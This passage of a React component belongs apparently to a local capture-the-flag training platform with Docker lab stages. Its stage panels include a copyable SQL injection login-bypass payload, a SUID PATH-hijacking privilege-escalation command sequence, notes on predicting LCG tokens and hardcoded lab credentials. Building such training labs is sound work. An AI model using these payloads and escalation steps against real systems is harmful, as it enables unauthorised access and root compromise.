                        {copiedSnippet === 's4_test' ? '✓ Copied!' : '📋 Copy'}
                      </button>
                    </div>
                  </div>
                </div>
              )}

              {/* Tab 2: Connect & Endpoints */}
              {stage4Tab === 'connect' && (
                <div className="space-y-4 animate-fade-in font-mono text-xs">
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    <div className="p-3.5 bg-[#080A0D] border border-[#232B36] rounded-xl">
                      <span className="text-[10px] text-[#8B949E] block mb-1">TARGET WEB URL</span>
                      <a href="http://localhost:8084" target="_blank" rel="noopener noreferrer" className="text-[#10B981] font-bold hover:underline block">
                        http://localhost:8084
                      </a>
                      <span className="text-[10px] text-[#8B949E] mt-1 block">Login Endpoint: <code className="text-[#F5F5F5]">/login</code></span>
                    </div>
                    <div className="p-3.5 bg-[#080A0D] border border-[#232B36] rounded-xl">
                      <span className="text-[10px] text-[#8B949E] block mb-1">KNOWN STAFF ACCOUNT</span>
                      <span className="text-[#FF9F43] font-bold block select-all">jordan.lee</span>
                      <span className="text-[10px] text-[#8B949E] mt-1 block">Password: <code className="text-[#F5F5F5]">WelcomeToNexa2026!</code></span>
                    </div>
                  </div>

                  <div className="p-3.5 bg-[#080A0D] border border-[#232B36] rounded-xl flex items-center justify-between">
                    <div>
                      <strong className="text-[#F5F5F5] block text-[11px]">Command Line Test (cURL)</strong>
                      <code className="text-[#10B981] text-[11px]">curl -s http://localhost:8084/login | grep &quot;NexaAuth&quot;</code>
                    </div>
                    <button
                      type="button"
                      onClick={() => copyToClipboard('curl -s http://localhost:8084/login | grep "NexaAuth"', 's4_curl')}
                      className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#FF9F43] px-3 py-1.5 rounded border border-[#FF9F43]/40 cursor-pointer font-bold flex-shrink-0"
                    >
                      {copiedSnippet === 's4_curl' ? '✓ Copied!' : '📋 Copy'}
                    </button>
                  </div>
                </div>
              )}

              {/* Tab 3: SQLi Attack Vector */}
              {stage4Tab === 'attack' && (
                <div className="space-y-4 animate-fade-in font-mono text-xs">
                  <div className="p-4 bg-[#080A0D] border border-[#232B36] rounded-xl space-y-3">
                    <span className="text-[#FF8533] block text-xs font-bold">SQL INJECTION VULNERABILITY:</span>
                    <p className="text-[#8B949E] text-xs font-sans leading-relaxed">
                      The authentication backend constructs SQL queries via direct string concatenation without parameterized inputs:
                    </p>
                    <div className="p-2.5 bg-[#050709] border border-[#232B36] rounded-lg text-[#FF9F43]">
                      <code>SELECT * FROM users WHERE username = &apos;&apos; + input + &apos;&apos; AND password = ...</code>
                    </div>
                    <div className="p-3 bg-[#141920] border border-[#232B36] rounded-lg space-y-2">
                      <div className="flex items-center justify-between">
                        <strong className="text-[#F5F5F5] text-[11px]">Recommended Authentication Bypass Payload:</strong>
                        <button
                          type="button"
                          onClick={() => copyToClipboard("admin' OR '1'='1' --", 's4_payload')}
                          className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#10B981] px-2.5 py-1 rounded border border-[#10B981]/40 cursor-pointer font-bold"
                        >
                          {copiedSnippet === 's4_payload' ? '✓ Copied!' : '📋 Copy Payload'}
                        </button>
                      </div>
                      <code className="text-[#10B981] text-xs block bg-[#080A0D] p-2 rounded border border-[#232B36] select-all">
                        admin&apos; OR &apos;1&apos;=&apos;1&apos; --
                      </code>
                      <span className="text-[11px] text-[#8B949E] font-sans block">
                        Enter this in the <strong>Username</strong> field on <code className="text-[#F5F5F5]">/login</code> (any password) to bypass verification and claim the employee portal flag.
                      </span>
                    </div>
                  </div>
                </div>
              )}

              {/* Tab 4: Stop Service (Save RAM) */}
              {stage4Tab === 'stop' && (
                <div className="space-y-4 animate-fade-in font-mono text-xs">
                  <div className="p-4 bg-[#080A0D] border border-[#232B36] rounded-xl space-y-3">
                    <span className="font-bold text-[#F5F5F5] text-sm block">
                      ⏹️ Stop Stage 4 Target Service (Conserve System RAM)
                    </span>
                    <p className="text-[#8B949E] text-xs font-sans leading-relaxed">
                      To preserve PC memory and prevent background CPU consumption when you are not solving this challenge:
                    </p>

                    <div className="p-3 bg-[#141920] border border-[#232B36] rounded-lg flex items-center justify-between">
                      <div>
                        <strong className="text-[#F5F5F5] block text-[11px]">Stop Docker Service</strong>
                        <code className="text-[#EF4444] text-[11px]">docker compose -f stages/stage4-web/docker-compose.yml down</code>
                      </div>
                      <button
                        type="button"
                        onClick={() => copyToClipboard('docker compose -f stages/stage4-web/docker-compose.yml down', 's4_docker_stop')}
                        className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#EF4444] px-3 py-1.5 rounded border border-[#EF4444]/40 cursor-pointer font-bold flex-shrink-0"
                      >
                        {copiedSnippet === 's4_docker_stop' ? '✓ Copied!' : '📋 Copy'}
                      </button>
                    </div>

                    <div className="p-3 bg-[#141920] border border-[#232B36] rounded-lg flex items-center justify-between">
                      <div>
                        <strong className="text-[#F5F5F5] block text-[11px]">Kill Native Python Process</strong>
                        <code className="text-[#EF4444] text-[11px]">pkill -f &quot;stages/stage4-web/app.py&quot;</code>
                      </div>
                      <button
                        type="button"
                        onClick={() => copyToClipboard('pkill -f "stages/stage4-web/app.py"', 's4_py_stop')}
                        className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#EF4444] px-3 py-1.5 rounded border border-[#EF4444]/40 cursor-pointer font-bold flex-shrink-0"
                      >
                        {copiedSnippet === 's4_py_stop' ? '✓ Copied!' : '📋 Copy'}
                      </button>
                    </div>
                  </div>
                </div>
              )}
            </div>
          )}

          {/* Stage 5: PRNG Token Predictor (Scripting) */}
          {challenge.stage_number === 5 && (
            <div className="cyber-panel p-5 sm:p-6 space-y-5 bg-[#0E1217] border border-[#242C37]">
              {/* Header & Quick Action Launchers */}
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-[#232B36] pb-4">
                <div>
                  <div className="flex items-center gap-2 mb-1">
                    <span className="text-[10px] font-mono font-bold px-2 py-0.5 rounded bg-[#FF6B00]/20 text-[#FF8533] border border-[#FF6B00]/40 uppercase tracking-wider">
                      Algorithmic Scripting &amp; Math
                    </span>
                    <span className="text-[10px] font-mono text-[#10B981] bg-[#10B981]/15 px-2 py-0.5 rounded border border-[#10B981]/30">
                      TCP Port 5005 • LCG State Recovery
                    </span>
                  </div>
                  <h3 className="font-sans text-lg font-bold text-[#F5F5F5] flex items-center gap-2">
                    <span className="text-[#FF6B00]">⚡</span> PRNG Token Engine Stream
                  </h3>
                  <p className="text-xs text-[#8B949E] font-sans mt-0.5">
                    NexaCorp Dynamic Token Engine running on TCP port 5005. Deduce LCG parameters to predict future tokens.
                  </p>
                </div>
                <div className="flex flex-wrap items-center gap-2 flex-shrink-0">
                  <a
                    href="/downloads/stage5-starter.py"
                    download
                    className="btn-primary text-xs font-mono font-bold px-3.5 py-2 flex items-center gap-1.5 shadow-[0_0_14px_rgba(255,107,0,0.25)]"
                  >
                    <span>📥</span> STARTER SCRIPT (.PY)
                  </a>
                </div>
              </div>

              {/* Navigation Tabs */}
              <div className="flex flex-wrap gap-1.5 border-b border-[#232B36] pb-2 text-xs font-mono">
                <button
                  type="button"
                  onClick={() => setStage5Tab('start')}
                  className={`px-3 py-1.5 rounded-lg transition-all cursor-pointer font-bold flex items-center gap-1.5 ${
                    stage5Tab === 'start'
                      ? 'bg-[#FF6B00] text-white shadow-[0_0_12px_rgba(255,107,0,0.3)]'
                      : 'bg-[#141920] text-[#8B949E] hover:text-[#F5F5F5] hover:bg-[#1A212B]'
                  }`}
                >
                  🚀 How to Start
                </button>
                <button
                  type="button"
                  onClick={() => setStage5Tab('connect')}
                  className={`px-3 py-1.5 rounded-lg transition-all cursor-pointer font-bold flex items-center gap-1.5 ${
                    stage5Tab === 'connect'
                      ? 'bg-[#FF6B00] text-white shadow-[0_0_12px_rgba(255,107,0,0.3)]'
                      : 'bg-[#141920] text-[#8B949E] hover:text-[#F5F5F5] hover:bg-[#1A212B]'
                  }`}
                >
                  ⚡ Connect &amp; Stream (5005)
                </button>
                <button
                  type="button"
                  onClick={() => setStage5Tab('algo')}
                  className={`px-3 py-1.5 rounded-lg transition-all cursor-pointer font-bold flex items-center gap-1.5 ${
                    stage5Tab === 'algo'
                      ? 'bg-[#FF6B00] text-white shadow-[0_0_12px_rgba(255,107,0,0.3)]'
                      : 'bg-[#141920] text-[#8B949E] hover:text-[#F5F5F5] hover:bg-[#1A212B]'
                  }`}
                >
                  📐 LCG Mathematics
                </button>
                <button
                  type="button"
                  onClick={() => setStage5Tab('stop')}
                  className={`px-3 py-1.5 rounded-lg transition-all cursor-pointer font-bold flex items-center gap-1.5 ${
                    stage5Tab === 'stop'
                      ? 'bg-[#FF6B00] text-white shadow-[0_0_12px_rgba(255,107,0,0.3)]'
                      : 'bg-[#141920] text-[#8B949E] hover:text-[#F5F5F5] hover:bg-[#1A212B]'
                  }`}
                >
                  ⏹️ Stop (Save RAM)
                </button>
              </div>

              {/* Tab 1: How to Start */}
              {stage5Tab === 'start' && (
                <div className="space-y-4 animate-fade-in font-mono text-xs">
                  <div className="p-4 bg-[#080A0D] border border-[#232B36] rounded-xl space-y-3">
                    <span className="font-bold text-[#F5F5F5] text-sm block">
                      🚀 Start Stage 5 PRNG Token Daemon (Port 5005)
                    </span>
                    <p className="text-[#8B949E] text-xs font-sans leading-relaxed">
                      Launch the token stream socket on demand. Choose Docker Compose or native Python:
                    </p>

                    <div className="p-3 bg-[#141920] border border-[#232B36] rounded-lg flex items-center justify-between">
                      <div>
                        <strong className="text-[#F5F5F5] block text-[11px]">Option A: Docker Compose</strong>
                        <code className="text-[#10B981] text-[11px]">docker compose -f stages/stage5-linux/docker-compose.yml up -d</code>
                      </div>
                      <button
                        type="button"
                        onClick={() => copyToClipboard('docker compose -f stages/stage5-linux/docker-compose.yml up -d', 's5_docker_start')}
                        className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#FF9F43] px-3 py-1.5 rounded border border-[#FF9F43]/40 cursor-pointer font-bold flex-shrink-0"
                      >
                        {copiedSnippet === 's5_docker_start' ? '✓ Copied!' : '📋 Copy'}
                      </button>
                    </div>

                    <div className="p-3 bg-[#141920] border border-[#232B36] rounded-lg flex items-center justify-between">
                      <div>
                        <strong className="text-[#F5F5F5] block text-[11px]">Option B: Native Python Server</strong>
                        <code className="text-[#10B981] text-[11px]">python3 stages/stage5-linux/server.py</code>
                      </div>
                      <button
                        type="button"
                        onClick={() => copyToClipboard('python3 stages/stage5-linux/server.py', 's5_py_start')}
                        className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#FF9F43] px-3 py-1.5 rounded border border-[#FF9F43]/40 cursor-pointer font-bold flex-shrink-0"
                      >
                        {copiedSnippet === 's5_py_start' ? '✓ Copied!' : '📋 Copy'}
                      </button>
                    </div>

                    <div className="p-3 bg-[#141920] border border-[#232B36] rounded-lg flex items-center justify-between">
                      <div>
                        <strong className="text-[#F5F5F5] block text-[11px]">Check Port 5005 Availability</strong>
                        <code className="text-[#8B949E] text-[11px]">nc -zv localhost 5005</code>
                      </div>
                      <button
                        type="button"
                        onClick={() => copyToClipboard('nc -zv localhost 5005', 's5_port_test')}
                        className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#10B981] px-3 py-1.5 rounded border border-[#10B981]/40 cursor-pointer font-bold flex-shrink-0"
                      >
                        {copiedSnippet === 's5_port_test' ? '✓ Copied!' : '📋 Copy'}
                      </button>
                    </div>
                  </div>
                </div>
              )}

              {/* Tab 2: Connect & Stream */}
              {stage5Tab === 'connect' && (
                <div className="space-y-4 animate-fade-in font-mono text-xs">
                  <div className="p-4 bg-[#080A0D] border border-[#232B36] rounded-xl space-y-3">
                    <div className="flex items-center justify-between">
                      <span className="font-bold text-[#F5F5F5] text-sm flex items-center gap-2">
                        <span>⚡</span> Interactive TCP Netcat Connection
                      </span>
                      <button
                        type="button"
                        onClick={() => copyToClipboard('nc localhost 5005', 's5_nc')}
                        className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#FF9F43] px-2.5 py-1 rounded border border-[#FF9F43]/40 cursor-pointer font-bold"
                      >
                        {copiedSnippet === 's5_nc' ? '✓ Copied!' : '📋 Copy nc Command'}
                      </button>
                    </div>
                    <div className="p-2.5 bg-[#050709] border border-[#232B36] rounded-lg select-all text-[#10B981] overflow-x-auto">
                      <code>nc localhost 5005</code>
                    </div>
                    <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 pt-1 text-[11px]">
                      <div className="p-2 bg-[#141920] rounded border border-[#232B36]">
                        <span className="text-[#8B949E] block text-[10px]">HOST</span>
                        <strong className="text-[#F5F5F5]">localhost</strong>
                      </div>
                      <div className="p-2 bg-[#141920] rounded border border-[#232B36]">
                        <span className="text-[#8B949E] block text-[10px]">PORT</span>
                        <strong className="text-[#10B981]">5005</strong>
                      </div>
                      <div className="p-2 bg-[#141920] rounded border border-[#232B36]">
                        <span className="text-[#8B949E] block text-[10px]">PROTOCOL</span>
                        <strong className="text-[#FF9F43]">Raw TCP</strong>
                      </div>
                      <div className="p-2 bg-[#141920] rounded border border-[#232B36]">
                        <span className="text-[#8B949E] block text-[10px]">STREAM</span>
                        <strong className="text-[#F5F5F5]">Interactive CLI</strong>
                      </div>
                    </div>
                  </div>

                  <div className="p-3.5 bg-[#080A0D] border border-[#232B36] rounded-xl flex items-center justify-between">
                    <div>
                      <strong className="text-[#F5F5F5] block text-[11px]">Download Python Client Script</strong>
                      <span className="text-[#8B949E] text-[11px] font-sans">Socket helper template to automate token acquisition and answer submission</span>
                    </div>
                    <a
                      href="/downloads/stage5-starter.py"
                      download
                      className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#10B981] px-3 py-1.5 rounded border border-[#10B981]/40 font-bold"
                    >
                      📥 stage5-starter.py
                    </a>
                  </div>
                </div>
              )}

              {/* Tab 3: LCG Mathematics */}
              {stage5Tab === 'algo' && (
                <div className="space-y-4 animate-fade-in font-mono text-xs">
                  <div className="p-4 bg-[#080A0D] border border-[#232B36] rounded-xl space-y-3">
                    <span className="text-[#FF8533] block text-xs font-bold">PRNG MATHEMATICAL FORMULA:</span>
                    <div className="p-2.5 bg-[#050709] border border-[#232B36] rounded-lg text-[#10B981]">
                      <code>X_{'{n+1}'} = (a * X_n + c) mod m</code>
                    </div>
                    <p className="text-[#8B949E] text-xs font-sans leading-relaxed">
                      Linear Congruential Generators are not cryptographically secure. Given consecutive outputs <code className="text-[#FF9F43] font-mono">X0, X1, X2, X3, X4, X5</code>, solve for multiplier <code className="text-[#F5F5F5] font-mono">a</code>, increment <code className="text-[#F5F5F5] font-mono">c</code>, and modulus <code className="text-[#F5F5F5] font-mono">m</code> using modular arithmetic / GCD differences to compute the next token in stream and win the flag.
                    </p>
                  </div>
                </div>
              )}

              {/* Tab 4: Stop Service (Save RAM) */}
              {stage5Tab === 'stop' && (
                <div className="space-y-4 animate-fade-in font-mono text-xs">
                  <div className="p-4 bg-[#080A0D] border border-[#232B36] rounded-xl space-y-3">
                    <span className="font-bold text-[#F5F5F5] text-sm block">
                      ⏹️ Stop Stage 5 Service (Conserve System RAM)
                    </span>
                    <div className="p-3 bg-[#141920] border border-[#232B36] rounded-lg flex items-center justify-between">
                      <div>
                        <strong className="text-[#F5F5F5] block text-[11px]">Stop Docker Service</strong>
                        <code className="text-[#EF4444] text-[11px]">docker compose -f stages/stage5-linux/docker-compose.yml down</code>
                      </div>
                      <button
                        type="button"
                        onClick={() => copyToClipboard('docker compose -f stages/stage5-linux/docker-compose.yml down', 's5_docker_stop')}
                        className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#EF4444] px-3 py-1.5 rounded border border-[#EF4444]/40 cursor-pointer font-bold flex-shrink-0"
                      >
                        {copiedSnippet === 's5_docker_stop' ? '✓ Copied!' : '📋 Copy'}
                      </button>
                    </div>

                    <div className="p-3 bg-[#141920] border border-[#232B36] rounded-lg flex items-center justify-between">
                      <div>
                        <strong className="text-[#F5F5F5] block text-[11px]">Kill Native Python Process</strong>
                        <code className="text-[#EF4444] text-[11px]">pkill -f &quot;stages/stage5-linux/server.py&quot;</code>
                      </div>
                      <button
                        type="button"
                        onClick={() => copyToClipboard('pkill -f "stages/stage5-linux/server.py"', 's5_py_stop')}
                        className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#EF4444] px-3 py-1.5 rounded border border-[#EF4444]/40 cursor-pointer font-bold flex-shrink-0"
                      >
                        {copiedSnippet === 's5_py_stop' ? '✓ Copied!' : '📋 Copy'}
                      </button>
                    </div>
                  </div>
                </div>
              )}
            </div>
          )}

          {/* Stage 6: Binary Disassembly (Reverse Engineering) */}
          {challenge.stage_number === 6 && (
            <div className="cyber-panel p-5 sm:p-6 space-y-4 bg-[#0E1217]">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-[#232B36] pb-3">
                <div>
                  <h3 className="font-sans text-base font-bold text-[#F5F5F5] flex items-center gap-2">
                    <span className="text-[#FF6B00]">🔬</span> ELF Reverse Engineering Sandbox
                  </h3>
                  <p className="text-xs text-[#8B949E] font-sans mt-0.5">
                    Isolated x86_64 defense daemon container with anti-debugging traps and serial verification routines.
                  </p>
                </div>
                <div className="px-3 py-1.5 bg-[#141920] border border-[#10B981]/40 rounded text-xs font-mono text-[#10B981] font-bold">
                  SSH PORT 2222 ACTIVE
                </div>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 font-mono text-xs">
                <div className="p-3 bg-[#080A0D] border border-[#232B36] rounded-lg">
                  <span className="text-[10px] text-[#8B949E] block mb-1">INTERACTIVE SSH ACCESS</span>
                  <code className="text-[#10B981] font-bold block select-all">ssh -p 2222 player@localhost</code>
                  <span className="text-[10px] text-[#8B949E] mt-0.5 block">Password: password123</span>
                </div>
                <div className="p-3 bg-[#080A0D] border border-[#232B36] rounded-lg">
                  <span className="text-[10px] text-[#8B949E] block mb-1">DOWNLOAD TARGET BINARY</span>
                  <code className="text-[#FF9F43] font-bold block select-all">scp -P 2222 player@localhost:~/challenges/stage6/target.bin ./</code>
                </div>
              </div>

              <div className="p-3.5 bg-[#080A0D] border border-[#232B36] rounded-lg text-xs font-mono space-y-1">
                <span className="text-[#FF8533] block text-[11px] font-semibold">ANALYSIS WALKTHROUGH:</span>
                <p className="text-[#8B949E] text-[11px] font-sans leading-relaxed">
                  Load the retrieved ELF binary into Ghidra, IDA, or GDB. Locate the validation routine, observe the symmetric XOR loop against static data, and reverse the algorithm to produce the valid license key.
                </p>
              </div>
            </div>
          )}

          {/* Stage 7: Production Host PrivEsc (Linux Security) */}
          {challenge.stage_number === 7 && (
            <div className="cyber-panel p-5 sm:p-6 space-y-5 bg-[#0E1217] border border-[#242C37]">
              {/* Header & Quick Action Launchers */}
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-[#232B36] pb-4">
                <div>
                  <div className="flex items-center gap-2 mb-1">
                    <span className="text-[10px] font-mono font-bold px-2 py-0.5 rounded bg-[#FF6B00]/20 text-[#FF8533] border border-[#FF6B00]/40 uppercase tracking-wider">
                      Linux Host Privilege Escalation
                    </span>
                    <span className="text-[10px] font-mono text-[#10B981] bg-[#10B981]/15 px-2 py-0.5 rounded border border-[#10B981]/30">
                      SSH Port 2227 • SUID / PATH Hijacking
                    </span>
                  </div>
                  <h3 className="font-sans text-lg font-bold text-[#F5F5F5] flex items-center gap-2">
                    <span className="text-[#FF6B00]">👑</span> Production Host Privilege Escalation
                  </h3>
                  <p className="text-xs text-[#8B949E] font-sans mt-0.5">
                    NexaCorp Production Linux Bastion Host. Enumerate misconfigured SUID binaries and elevate to root.
                  </p>
                </div>
                <div className="flex flex-wrap items-center gap-2 flex-shrink-0">
                  <button
                    type="button"
                    onClick={() =>
                      copyToClipboard(
                        'ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2227 player@localhost',
                        's7_quick_ssh'
                      )
                    }
                    className="btn-primary text-xs font-mono font-bold px-3.5 py-2 flex items-center gap-1.5 shadow-[0_0_14px_rgba(255,107,0,0.25)]"
                  >
                    <span>🔑</span> {copiedSnippet === 's7_quick_ssh' ? 'COPIED SSH!' : 'COPY SSH COMMAND'}
                  </button>
                </div>
              </div>

              {/* Navigation Tabs */}
              <div className="flex flex-wrap gap-1.5 border-b border-[#232B36] pb-2 text-xs font-mono">
                <button
                  type="button"
                  onClick={() => setStage7Tab('start')}
                  className={`px-3 py-1.5 rounded-lg transition-all cursor-pointer font-bold flex items-center gap-1.5 ${
                    stage7Tab === 'start'
                      ? 'bg-[#FF6B00] text-white shadow-[0_0_12px_rgba(255,107,0,0.3)]'
                      : 'bg-[#141920] text-[#8B949E] hover:text-[#F5F5F5] hover:bg-[#1A212B]'
                  }`}
                >
                  🚀 How to Start
                </button>
                <button
                  type="button"
                  onClick={() => setStage7Tab('ssh')}
                  className={`px-3 py-1.5 rounded-lg transition-all cursor-pointer font-bold flex items-center gap-1.5 ${
                    stage7Tab === 'ssh'
                      ? 'bg-[#FF6B00] text-white shadow-[0_0_12px_rgba(255,107,0,0.3)]'
                      : 'bg-[#141920] text-[#8B949E] hover:text-[#F5F5F5] hover:bg-[#1A212B]'
                  }`}
                >
                  🔑 SSH Connection
                </button>
                <button
                  type="button"
                  onClick={() => setStage7Tab('privesc')}
                  className={`px-3 py-1.5 rounded-lg transition-all cursor-pointer font-bold flex items-center gap-1.5 ${
                    stage7Tab === 'privesc'
                      ? 'bg-[#FF6B00] text-white shadow-[0_0_12px_rgba(255,107,0,0.3)]'
                      : 'bg-[#141920] text-[#8B949E] hover:text-[#F5F5F5] hover:bg-[#1A212B]'
                  }`}
                >
                  👑 PrivEsc Exploitation
                </button>
                <button
                  type="button"
                  onClick={() => setStage7Tab('stop')}
                  className={`px-3 py-1.5 rounded-lg transition-all cursor-pointer font-bold flex items-center gap-1.5 ${
                    stage7Tab === 'stop'
                      ? 'bg-[#FF6B00] text-white shadow-[0_0_12px_rgba(255,107,0,0.3)]'
                      : 'bg-[#141920] text-[#8B949E] hover:text-[#F5F5F5] hover:bg-[#1A212B]'
                  }`}
                >
                  ⏹️ Stop (Save RAM)
                </button>
              </div>

              {/* Tab 1: How to Start */}
              {stage7Tab === 'start' && (
                <div className="space-y-4 animate-fade-in font-mono text-xs">
                  <div className="p-4 bg-[#080A0D] border border-[#232B36] rounded-xl space-y-3">
                    <span className="font-bold text-[#F5F5F5] text-sm block">
                      🚀 Start Stage 7 Linux Bastion Environment (Port 2227)
                    </span>
                    <p className="text-[#8B949E] text-xs font-sans leading-relaxed">
                      Start only when ready to solve. You can use Docker (isolated container with SSH server) or configure locally on Linux:
                    </p>

                    <div className="p-3 bg-[#141920] border border-[#232B36] rounded-lg flex items-center justify-between">
                      <div>
                        <strong className="text-[#F5F5F5] block text-[11px]">Option A: Docker Bastion Container (Recommended)</strong>
                        <code className="text-[#10B981] text-[11px]">docker compose -f stages/stage7-linux-security/docker-compose.yml up -d</code>
                      </div>
                      <button
                        type="button"
                        onClick={() => copyToClipboard('docker compose -f stages/stage7-linux-security/docker-compose.yml up -d', 's7_docker_start')}
                        className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#FF9F43] px-3 py-1.5 rounded border border-[#FF9F43]/40 cursor-pointer font-bold flex-shrink-0"
                      >
                        {copiedSnippet === 's7_docker_start' ? '✓ Copied!' : '📋 Copy'}
                      </button>
                    </div>

                    <div className="p-3 bg-[#141920] border border-[#232B36] rounded-lg flex items-center justify-between">
                      <div>
                        <strong className="text-[#F5F5F5] block text-[11px]">Option B: Native Setup Script (Linux Host)</strong>
                        <code className="text-[#10B981] text-[11px]">sudo ./stages/stage7-linux-security/setup_privesc.sh</code>
                      </div>
                      <button
                        type="button"
                        onClick={() => copyToClipboard('sudo ./stages/stage7-linux-security/setup_privesc.sh', 's7_native_start')}
                        className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#FF9F43] px-3 py-1.5 rounded border border-[#FF9F43]/40 cursor-pointer font-bold flex-shrink-0"
                      >
                        {copiedSnippet === 's7_native_start' ? '✓ Copied!' : '📋 Copy'}
                      </button>
                    </div>
                  </div>
                </div>
              )}

              {/* Tab 2: SSH Connection */}
              {stage7Tab === 'ssh' && (
                <div className="space-y-4 animate-fade-in font-mono text-xs">
                  <div className="p-4 bg-[#080A0D] border border-[#232B36] rounded-xl space-y-3">
                    <div className="flex items-center justify-between">
                      <span className="font-bold text-[#F5F5F5] text-sm flex items-center gap-2">
                        <span>🔑</span> SSH Access to Target Bastion
                      </span>
                      <button
                        type="button"
                        onClick={() =>
                          copyToClipboard(
                            'ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2227 player@localhost',
                            's7_ssh'
                          )
                        }
                        className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#FF9F43] px-2.5 py-1 rounded border border-[#FF9F43]/40 cursor-pointer font-bold"
                      >
                        {copiedSnippet === 's7_ssh' ? '✓ Copied!' : '📋 Copy SSH Command'}
                      </button>
                    </div>
                    <div className="p-2.5 bg-[#050709] border border-[#232B36] rounded-lg select-all text-[#10B981] overflow-x-auto">
                      <code>ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2227 player@localhost</code>
                    </div>
                    <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 pt-1 text-[11px]">
                      <div className="p-2 bg-[#141920] rounded border border-[#232B36]">
                        <span className="text-[#8B949E] block text-[10px]">HOST</span>
                        <strong className="text-[#F5F5F5]">localhost</strong>
                      </div>
                      <div className="p-2 bg-[#141920] rounded border border-[#232B36]">
                        <span className="text-[#8B949E] block text-[10px]">PORT</span>
                        <strong className="text-[#10B981]">2227</strong>
                      </div>
                      <div className="p-2 bg-[#141920] rounded border border-[#232B36]">
                        <span className="text-[#8B949E] block text-[10px]">USER</span>
                        <strong className="text-[#FF9F43]">player</strong>
                      </div>
                      <div className="p-2 bg-[#141920] rounded border border-[#232B36]">
                        <span className="text-[#8B949E] block text-[10px]">PASSWORD</span>
                        <strong className="text-[#F5F5F5] select-all">password123</strong>
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {/* Tab 3: PrivEsc Exploitation */}
              {stage7Tab === 'privesc' && (
                <div className="space-y-4 animate-fade-in font-mono text-xs">
                  <div className="p-4 bg-[#080A0D] border border-[#232B36] rounded-xl space-y-3">
                    <span className="text-[#FF8533] block text-xs font-bold">EXPLOITATION WORKFLOW:</span>
                    <div className="space-y-2 text-[#8B949E] text-xs font-sans">
                      <div className="p-2.5 bg-[#141920] rounded-lg border border-[#232B36] space-y-1">
                        <strong className="text-[#F5F5F5] block font-mono text-[11px]">1. Search for SUID Binaries</strong>
                        <code className="text-[#10B981] font-mono block select-all">find / -perm -4000 -type f 2&gt;/dev/null</code>
                        <span className="text-[10px] text-[#8B949E] block">Identify proprietary binary: <code className="text-[#FF9F43]">/usr/local/bin/nexa-backup</code></span>
                      </div>
                      <div className="p-2.5 bg-[#141920] rounded-lg border border-[#232B36] space-y-1">
                        <strong className="text-[#F5F5F5] block font-mono text-[11px]">2. Inspect Binary Strings</strong>
                        <code className="text-[#10B981] font-mono block select-all">strings /usr/local/bin/nexa-backup</code>
                        <span className="text-[10px] text-[#8B949E] block">Note relative call to <code className="text-[#FF9F43]">tar</code> without absolute path (<code className="text-[#EF4444]">tar -czf ...</code>).</span>
                      </div>
                      <div className="p-2.5 bg-[#141920] rounded-lg border border-[#232B36] space-y-1">
                        <strong className="text-[#F5F5F5] block font-mono text-[11px]">3. Execute PATH Hijacking Exploit</strong>
                        <div className="p-2 bg-[#050709] rounded border border-[#232B36] font-mono text-[11px] text-[#10B981] select-all">
                          <div>echo &apos;/bin/bash -p&apos; &gt; /tmp/tar &amp;&amp; chmod +x /tmp/tar</div>
                          <div>export PATH=/tmp:$PATH</div>
                          <div>/usr/local/bin/nexa-backup</div>
                          <div>cat /root/flag.txt</div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {/* Tab 4: Stop Service (Save RAM) */}
              {stage7Tab === 'stop' && (
                <div className="space-y-4 animate-fade-in font-mono text-xs">
                  <div className="p-4 bg-[#080A0D] border border-[#232B36] rounded-xl space-y-3">
                    <span className="font-bold text-[#F5F5F5] text-sm block">
                      ⏹️ Stop Stage 7 Environment (Conserve System RAM)
                    </span>
                    <div className="p-3 bg-[#141920] border border-[#232B36] rounded-lg flex items-center justify-between">
                      <div>
                        <strong className="text-[#F5F5F5] block text-[11px]">Stop Docker Bastion</strong>
                        <code className="text-[#EF4444] text-[11px]">docker compose -f stages/stage7-linux-security/docker-compose.yml down</code>
                      </div>
                      <button
                        type="button"
                        onClick={() => copyToClipboard('docker compose -f stages/stage7-linux-security/docker-compose.yml down', 's7_docker_stop')}
                        className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#EF4444] px-3 py-1.5 rounded border border-[#EF4444]/40 cursor-pointer font-bold flex-shrink-0"
                      >
                        {copiedSnippet === 's7_docker_stop' ? '✓ Copied!' : '📋 Copy'}
                      </button>
                    </div>

                    <div className="p-3 bg-[#141920] border border-[#232B36] rounded-lg flex items-center justify-between">
                      <div>
                        <strong className="text-[#F5F5F5] block text-[11px]">Clean Up Native Bastion User (If Configured Natively)</strong>
                        <code className="text-[#EF4444] text-[11px]">sudo pkill -u player; sudo rm -f /usr/local/bin/nexa-backup</code>
                      </div>
                      <button
                        type="button"
                        onClick={() => copyToClipboard('sudo pkill -u player; sudo rm -f /usr/local/bin/nexa-backup', 's7_native_clean')}
                        className="text-[11px] bg-[#1A212B] hover:bg-[#242C37] text-[#EF4444] px-3 py-1.5 rounded border border-[#EF4444]/40 cursor-pointer font-bold flex-shrink-0"
                      >
